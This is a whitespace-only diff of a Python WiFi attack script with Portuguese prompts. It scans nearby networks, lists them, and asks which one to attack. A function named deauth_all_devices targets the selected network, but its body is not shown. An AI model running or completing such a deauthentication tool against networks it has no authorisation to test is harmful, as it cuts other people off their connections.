@@ -9,6 +9,7 @@ def get_wifi_networks(interface="wlan0mon"):
         scan_result = sniff(iface=interface, timeout=10, prn=lambda x: x.summary())
     except KeyboardInterrupt:
         pass
+
     for packet in scan_result:
         if packet.haslayer(Dot11Beacon):
             essid = packet[Dot11Elt].info.decode()
@@ -28,11 +29,13 @@ def deauth_all_devices(target_bssid, iface="wlan0mon"):
 if __name__ == "__main__":
     print("Escaneando redes WI-FI ao redor...")
     wifi_networks = get_wifi_networks()
+    
     if wifi_networks:
         os.system("clear")
         print("Redes WI-FI encontradas:")
         for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
             print(f"{idx}. ESSID: {essid}, BSSID: {bssid}")
+
         selected_option = int(input("ID da rede para o ataque: "))
         if 1 <= selected_option <= len(wifi_networks):
             selected_bssid = wifi_networks[selected_option - 1][1]
@@ -43,3 +46,4 @@ if __name__ == "__main__":
             print("Opção inválida.")
     else:
         print("O scan não identificou redes.")
+        
